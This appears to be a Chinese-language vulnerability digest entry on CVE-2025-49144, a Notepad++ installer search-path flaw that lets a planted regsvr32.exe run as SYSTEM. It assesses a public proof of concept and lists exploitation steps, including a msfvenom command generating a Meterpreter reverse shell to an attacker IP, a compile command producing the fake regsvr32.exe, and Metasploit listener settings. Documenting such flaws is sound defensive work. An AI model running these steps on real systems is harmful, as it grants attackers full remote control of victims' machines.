## CVE-2025-49144 - Notepad++ 本地权限提升 (LPE)

**漏洞编号:** CVE-2025-49144

**漏洞类型:** 本地权限提升 (LPE)

**影响应用:** Notepad++

**危害等级:** 高危

**CVSS评分:** N/A

**影响版本:** v8.8.1及更早版本 (所有低于v8.8.2的版本)

**利用条件:** 需要用户交互，受害者需运行安装程序；攻击者需将恶意文件放置在安装程序同目录下；本地访问权限

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-49144漏洞是一个在Notepad++ v8.8.1及更早版本安装程序中发现的高危本地权限提升漏洞。该漏洞源于安装程序在调用`regsvr32.exe`时没有使用完全限定路径，而是直接调用`regsvr32.exe some_dll`。Windows操作系统在执行未指定完整路径的可执行文件时，会按照特定的搜索路径顺序查找。这个顺序通常是：应用程序启动目录、System32目录、Windows目录、当前工作目录，以及PATH环境变量中定义的路径。攻击者可以利用这一机制，在合法Notepad++安装程序所在的目录下放置一个精心构造的恶意`regsvr32.exe`文件。当受害者运行合法的Notepad++安装程序时（通常以SYSTEM权限运行），系统会优先在安装程序所在的目录中找到并执行攻击者放置的恶意`regsvr32.exe`，而非系统路径下的合法文件。这样，恶意代码将以SYSTEM权限运行，从而允许攻击者完全控制目标机器。

**POC有效性分析**:
提供的POC代码是一个名为`regsvr32_loader.c`的C语言文件，结合详细的`README.md`说明，充分展示了`CVE-2025-49144`漏洞的利用过程。该POC的有效性体现在其清晰的攻击链和可复现性。POC首先指导用户使用`msfvenom`工具生成Meterpreter反向Shell的shellcode，然后将这段shellcode粘贴到`regsvr32_loader.c`文件中。接着，使用`mingw-w64`编译器将修改后的C代码编译成名为`regsvr32.exe`的恶意可执行文件。POC明确指出，需要下载一个易受攻击的Notepad++版本（例如v8.6.8），并将编译好的恶意`regsvr32.exe`放置在与Notepad++安装程序相同的目录下（例如“下载”文件夹）。最后，当用户执行Notepad++安装程序时，由于不安全的搜索路径行为，系统会加载并执行攻击者提供的恶意`regsvr32.exe`，从而以SYSTEM权限执行Meterpreter shellcode，实现权限提升。整个过程逻辑严密，每一步操作都清晰可循，并附带了Metasploit监听器的配置说明，使得攻击者能够成功接收到反向Shell。POC中提到的“This is a PoC thus tested with Windows defender and real time protection disabled”也表明了这是为了演示目的而设定的环境，并不会影响漏洞利用本身的有效性。此POC不仅验证了漏洞的存在，还提供了实际利用的完整流程，是一个高质量的、可操作的利用工具。

**利用步骤**:
1.  **生成Shellcode**: 攻击者首先使用`msfvenom`工具生成一个Meterpreter反向TCP shellcode。例如：`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<攻击者IP> LPORT=4444 -f c > shellcode.txt`。
2.  **修改POC代码**: 下载`regsvr32_loader.c`文件，并将`shellcode.txt`中生成的完整shellcode粘贴到`regsvr32_loader.c`文件指定的注释位置。
3.  **编译恶意执行文件**: 使用`x86_64-w64-mingw32-gcc`编译器将修改后的`regsvr32_loader.c`编译成名为`regsvr32.exe`的恶意可执行文件。例如：`x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows`。
4.  **设置Metasploit监听器**: 攻击者在自己的机器上启动`msfconsole`，配置一个`exploit/multi/handler`来监听反向连接：`use exploit/multi/handler`、`set payload windows/x64/meterpreter/reverse_tcp`、`set LHOST <攻击者IP>`、`set LPORT 4444`、`run`。
5.  **部署攻击文件**: 下载一个易受攻击的Notepad++版本安装程序（例如v8.6.8）。将编译好的恶意`regsvr32.exe`文件移动到与Notepad++安装程序相同的目录下，通常是用户的“下载”文件夹。
6.  **诱导执行**: 诱导受害者运行该目录下的Notepad++安装程序。
7.  **权限提升**: 当安装程序运行时，系统会优先加载恶意`regsvr32.exe`并以SYSTEM权限执行其中包含的shellcode，从而在攻击者的Metasploit监听器上建立一个SYSTEM权限的反向Meterpreter Shell。

**投毒风险分析**:
本POC的投毒风险被评估为较低（10%）。主要原因在于其代码的透明度和目的的明确性。POC提供的是一个C语言源代码文件`regsvr32_loader.c`，该文件旨在加载用户提供的shellcode。整个过程公开透明，用户可以清晰地看到代码的逻辑，即分配内存、将shellcode复制到内存中并执行。Shellcode本身是使用`msfvenom`生成的，攻击者可以自行控制其内容（例如，生成一个Meterpreter反向Shell）。POC中没有发现代码混淆、复杂的加密逻辑或未经解释的外部资源加载行为。它不包含任何额外的、与漏洞利用无关的恶意功能，例如下载其他恶意软件、修改系统配置或进行持久化操作。

尽管POC演示了如何以SYSTEM权限执行任意代码（通过shellcode），这本身是攻击性行为，但作为防御性安全研究，我们区分“利用漏洞的代码”与“带有额外恶意载荷的代码”。这个POC的核心是漏洞利用机制的演示，而不是传播后门。它的目的是帮助安全研究人员理解和复现漏洞，以便开发防御措施。如果攻击者想要利用此漏洞进行实际攻击，他们当然会修改shellcode以包含真正的恶意载荷。但就这个公开的POC本身而言，它是一个教学和验证工具，其设计清晰且目的单一，不包含隐藏的、意料之外的投毒风险。因此，我们认为其作为研究工具的可靠性较高，被恶意修改或嵌入后门的风险较低。用户在复现时，若遵循POC的指示生成并粘贴自己的shellcode，则风险可控。

**项目地址:** https://github.com/TheTorjanCaptain/CVE-2025-49144_PoC

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49144
